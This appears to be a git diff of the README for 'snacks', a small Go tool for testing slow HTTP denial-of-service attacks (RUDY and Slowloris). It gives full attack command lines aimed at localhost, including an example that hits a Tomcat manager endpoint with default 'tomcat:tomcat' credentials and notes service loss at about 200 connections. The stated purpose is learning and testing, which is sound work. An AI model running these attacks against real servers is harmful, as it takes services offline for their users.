@@ -1,8 +1,10 @@
 # snacks
 
-A small collection of basically (poorly) implemented tools for pen testing.
+A small collection of tools for limited testing of common HTTP vulnerabilities.
 
-This project is more of a learning experience in golang so will likely fall short of a lot of go best practices
+Goals:
+- Learn Go
+- Learn about common HTTP attack vectors
 
 ### Clone
 ```bash
@@ -13,8 +15,9 @@ git clone git@github.com:andrewflbarnes/snacks
 
 ### Build
 ```bash
+# local build
 make
-# or
+# local install
 make install
 ```
 
@@ -30,15 +33,15 @@ For a full list of options, defaults and what they do
 ./snacks judy -h
 ```
 
-The below command will
+```bash
+./snacks judy -size 1000000 -sd 10ms -sb 7 -vv localhost:8888/boom
+```
+The above command will
 - send 1000000 arbitrary bytes to hold the connection open (not including HTTP POST headers)
 - wait 10ms between sending each segment of bytes
 - send 7 bytes in every segment (excluding the initial HTTP POST headers)
 - set the path to `/boom` in the HTTP POST request and send to `localhost:8888`
 - enable trace logging
-```bash
-./snacks judy -size 1000000 -sd 10ms -sb 7 -vv localhost:8888/boom
-```
 
 
 ##### Loris
@@ -51,25 +54,23 @@ For a full list of options, defaults and what they do
 ./snacks loris -h
 ```
 
-The below command will
+```bash
+./snacks loris -size 1000000 -sd 1s -head "x-slow: loris" -vv localhost:8888/boom
+```
+The above command will
 - send 1000000 repeat instances of the header (not most application servers limit the max. number of HTTP headers)
 - wait 1s between sending each header
 - set the header to be set to `x-slow: loris`
 - set the path to `/boom` in the HTTP POST request and send to `localhost:8888`
 - enable trace logging
-```bash
-./snacks loris -size 1000000 -sd 1s -head "x-slow: loris" -vv localhost:8888/boom
-```
 
-### Useful options
-
-The `loris` attack will not use most of these options as it never completes sending the HTTP headers
+### Useful judy options
 
 ##### Content type
 
 If a specific content-type header is required use the `-type` flag. e.g.
 ```bash
-./snacks -type application/x-www-form-urlencoded ...
+./snacks judy -type application/x-www-form-urlencoded ...
 ```
 
 For supported content types this will set a default payload prefix which may be overridden with `-prefix`
@@ -77,19 +78,46 @@ For supported content types this will set a default payload prefix which may be 
 To override a payload prefix use the `-prefix` flag. e.g. for a default JSON content-type (which would otherwise
 default to using `{"a":"` as the payload prefix)
 ```bash
-./snacks -prefix '{"payload":"' ...
+./snacks judy -prefix '{"payload":"' ...
 ```
 
 For custom content-types and prefix apyloads specify both `-type` and `-prefix` e.g.
 ```bash
-./snacks -type application/xml -prefix '<payload>' ...
-./snacks -type application/vnd.my.custom.type -prefix '1|string|payload|' ...
+./snacks judy -type application/xml -prefix '<payload>' ...
+./snacks judy -type application/vnd.my.custom.type -prefix '1|string|payload|' ...
 ```
+
+### Useful general options
 
 ##### Authorization
 
 If authorization is required use either `-basic` or `-bearer` flags e.g.
 ```bash
-./snacks -basic tomcat:tomcat ...
-./snacks -bearer 0123456789ABCDEF ...
+./snacks loris -basic tomcat:tomcat ...
+./snacks judy -bearer 0123456789ABCDEF ...
 ```
+
+### Examples
+
+Tomcat 8 seems to be particularly susceptible to RUDY attacks in it's default configuration even using
+the Http11NioProtocol. For example you can hit a management endpoint or an arbitrary path on a
+springboot webapp:
+```bash
+snacks judy \
+  -size 1000000 \
+  -sb 10 \
+  -type application/x-www-form-urlencoded \
+  -basic tomcat:tomcat \
+  -max 400 \
+  localhost:8888/manager/html/expire
+
+snacks judy \
+  -size 1000000 \
+  -sb 10 \
+  -basic tomcat:tomcat \
+  -max 400 \
+  localhost:8888/mywebapp
+```
+
+Loss of service occurs around 200 connections in. Perhaps unsuprisingly this matches with the max number
+of threads Tomcat is configured to use by default.
